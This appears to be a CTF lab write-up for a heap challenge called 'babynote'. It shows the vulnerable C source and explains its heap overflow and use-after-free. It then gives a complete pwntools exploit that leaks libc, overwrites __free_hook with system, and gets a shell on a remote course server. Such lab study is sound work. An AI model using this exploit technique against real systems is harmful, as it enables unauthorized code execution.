# Simple PWN 0x18(Lab - `babynote`)
###### tags: `CTF` `PWN` `eductf`

Version: Ubuntu 20.04
## Background
* hook - [SS111-Pwn2](https://youtu.be/MwjSNFQIx0c?t=838)
![](https://imgur.com/lx8zR2J.png)
[Hook簡介](https://blog.xuite.net/peterlee.tw/twblog/112094832)
[Hook Function (攔截函式)](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&usg=AOvVaw26FwxmT40uQgIsFIlbjs2k)
* The process of free and priority
Assume we malloc a memory with size over <font color="FF0000">`0x410`</font>, then when we free it, it'll be classified to <font color="FF0000">`Unsorted bin`</font> instead of `tcache`
![](https://imgur.com/kCTN7cs.png)
![](https://imgur.com/u2Wy9xw.png)


## Original Code
:::spoiler code
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

struct Note
{
    char name[0x10];
    void *data;
};

struct Note *notes[0x10];

static short int get_idx()
{
    short int idx;

    printf("index\n> ");
    scanf("%hu", &idx);

    if (idx >= 0x10)
        printf("no, no ...\n"), exit(1);
    
    return idx;
}

static short int get_size()
{
    short int size;

    printf("size\n> ");
    scanf("%hu", &size);
    
    return size;
}

void add_note()
{
    short int idx;

    idx = get_idx();
    notes[idx] = malloc(sizeof(*notes[idx]));

    printf("note name\n> ");
    read(0, notes[idx]->name, 0x10);

    notes[idx]->data = NULL;
    printf("success!\n");
}

void edit_data()
{
    short int idx;
    short int size;

    idx = get_idx();
    size = get_size();

    if (notes[idx]->data == NULL)
        notes[idx]->data = malloc(size);
    
    read(0, notes[idx]->data, size);
    printf("success!\n");
}

void del_note()
{
    short int idx;

    idx = get_idx();
    free(notes[idx]->data);
    free(notes[idx]);
    printf("success!\n");
}

void show_notes()
{
    for (int i = 0; i < 0x10; i++) {
        if (notes[i] == NULL || notes[i]->data == NULL)
            continue;
        
        printf("[%d] %s\ndata: %s\n", i, notes[i]->name, (char *)notes[i]->data);
    }
}

int main()
{
    char opt[2];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    while (1)
    {
        printf("1. add_note\n"
               "2. edit_data\n"
               "3. del_note\n"
               "4. show_notes\n"
               "5. bye\n"
               "> ");
        read(0, opt, 2);

        switch (opt[0]) {
        case '1': add_note(); break;
        case '2': edit_data(); break;
        case '3': del_note(); break;
        case '4': show_notes(); break;
        case '5': exit(0);
        }
    }
    
    return 0;
}
```
:::
### Description
The data structure is as below, we can use `add_note` to create a new note and use `edit_note` to add/modify the data of note. Or just delete specific note or use `show_note` to print all of them.
![](https://imgur.com/nKwVmdO.png)
### Something Wrong
* edit_note has heap overflow
So that we can add 2 notes and use edit function to overlap the 2nd notes.
    ```python=
    add_note(0, b'a'*8)
    edit_note(0, 0xa, b'a')

    add_note(1, b'b'*8)
    edit_note(1, 0x30, b'a'*48) #<-- overlap
    ```

    * Before overlap
    ![](https://imgur.com/2BZOqMu.png)

    * After overlap
    ![](https://imgur.com/zVCt3bR.png)
* used after free(UAF)
It has not deleted the pointer when it was freed
    ```cpp!
    void del_note()
    {
        short int idx;

        idx = get_idx();
        free(notes[idx]->data);
        free(notes[idx]);
        printf("success!\n");
    }
    ```

### Preliminary Idea
Based on the problem we found above, we can try to use `__free_hook` to execute <font color="FF0000">`system('/bin/sh')`</font>

## Exploit - UAF + heap overflow + __free_hook
1. Try to construct heap structure that we need
    ```python!
    add_note(0, b'a'*8)    # index 0
    edit_note(0, 0x418, b'a')

    add_note(1, b'b'*8)    # index 1
    edit_note(1, 0x18, b'b')

    add_note(2, b'c'*8)    # index 2
    ```
    * `index 0` is for leaking the address of `libc`
    * `index 1` is to implement heap overflow
    * `index 2` is a fake chunk that we have to construct

2. Leak `libc` address and find `__free_hook`, `__libc_system`
* The reason that we set the data size of `index 0` be `0x418`(1048 in decimal) is because when we free it, it will be classified to `Unsorted bin` and the `fd` and `bk` will store the address of `libc`
![](https://imgur.com/6vhQrxv.png)
![](https://imgur.com/pTCDtZo.png)
Then we have to find where is `__libc_system` and `__free_hook`
    ```bash!
    pwndbg> p __libc_system
    $1 = {int (const char *)} 0x7f9614bac290 <__libc_system>
    pwndbg> p &__free_hook
    $2 = (void (**)(void *, const void *)) 0x7f9614d48e48 <__free_hook>
    ```
    The offset is
    `Unsorted bin fd`: $0x7f9614d46be0 - 0x7f9614b5a000 = 0x1ecbe0$
    `__libc_system`: $0x7f9614bac290 - 0x7f9614b5a000 = 0x52290$
    `__free_hook`: $0x7f9614d48e48 - 0x7f9614b5a000 = 0x1eee48$
    
    So, we delete `index 0` first, and try to use `show_note` function to receive the `Unsorted bin fd`
    ```python!
    delete_note(0)
    show_note()
    r.recvuntil(b'data:')
    libc = (u64(r.recv(8)) >> 8) - 0x1ecbe0 - 0xa000000000000
    info(f"libc address: {hex(libc)}")
    free_hook_addr = libc + 0x1eee48
    info(f"__free_hook address: {hex(free_hook_addr)}")
    libc_sys_addr = libc + 0x52290
    info(f"__libc_system address: {hex(libc_sys_addr)}")
    ```
3. Construct fake chunk by using heap overflow
    ```python!
    data = b'/bin/sh\x00'.ljust(0x10, b'b')
    fake_chunk = flat(
        0, 0x21,
        b'cccccccc', b'cccccccc',
        free_hook_addr
    )

    edit_note(1, 0x38, data + fake_chunk)
    edit_note(2, 0x8, p64(libc_sys_addr))
    ```
    ![](https://imgur.com/dSw1vms.png)
    Note that, the data of `note` structure is a pointer that point to a space that system malloc. Thus, `edit_note` function will modify the pointed space, so that `edit_note(b'2\n', b'8\n', p64(libc_sys_addr))` will modify `[free_hook_addr]` instead of `index 2`.
    ![](https://imgur.com/ycuFgwR.png)
    
4. Delete `index 1` and call `__free_hook`
When we free `index 1` and `__free_hook` is not NULL, then `__free_hook` can be a function pointer to execute `0x7ffbb6500290` that is `__libc_system` and the parameter is `index 1` data, that is `/bin/sh\x00`
    ```python!
    delete_note(1)
    ```

5. Well, we got shell!!
![](https://imgur.com/PJGAAba.png)

* Whole exploit
    :::spoiler code
    ```python=
    from pwn import *

    # r = process('./chal')
    r = remote('edu-ctf.zoolab.org', 10007)

    context.arch = 'amd64'

    def add_note(idx, note_name):
        r.sendafter(b'> ', b'1')
        r.sendlineafter(b'index\n> ', str(idx))
        r.sendafter(b'note name\n> ', note_name)

    def edit_note(idx, note_size, message):
        r.sendafter(b"> ", b"2")
        r.sendlineafter(b'index\n> ', str(idx))
        r.sendlineafter(b'size\n> ', str(note_size))
        r.send(message)

    def delete_note(idx):
        r.sendafter(b"> ", b"3")
        r.sendlineafter(b'index\n> ', str(idx))

    def show_note():
        r.sendafter(b"> ", b"4")

    '''------------------
    Construct heap memory
    ------------------'''
    add_note(0, b'a'*8)
    edit_note(0, 0x418, b'a')

    add_note(1, b'b'*8)
    edit_note(1, 0x18, b'b')

    add_note(2, b'c'*8)

    '''------------------
    Leak libc address
    ------------------'''
    delete_note(0)
    show_note()
    r.recvuntil(b'data:')
    libc = (u64(r.recv(8)) >> 8) - 0x1ecbe0 - 0xa000000000000
    info(f"libc address: {hex(libc)}")
    free_hook_addr = libc + 0x1eee48
    info(f"__free_hook address: {hex(free_hook_addr)}")
    libc_sys_addr = libc + 0x52290
    info(f"__libc_system address: {hex(libc_sys_addr)}")

    '''------------------
    Construct fake chunk
    ------------------'''
    data = b'/bin/sh\x00'.ljust(0x10, b'b')
    fake_chunk = flat(
        0, 0x21,
        b'cccccccc', b'cccccccc',
        free_hook_addr
    )

    edit_note(1, 0x38, data + fake_chunk)
    edit_note(2, 0x8, p64(libc_sys_addr))
    delete_note(1)

    r.interactive()
    ```
    :::
## Reference
[SS111-Pwn2](https://youtu.be/MwjSNFQIx0c)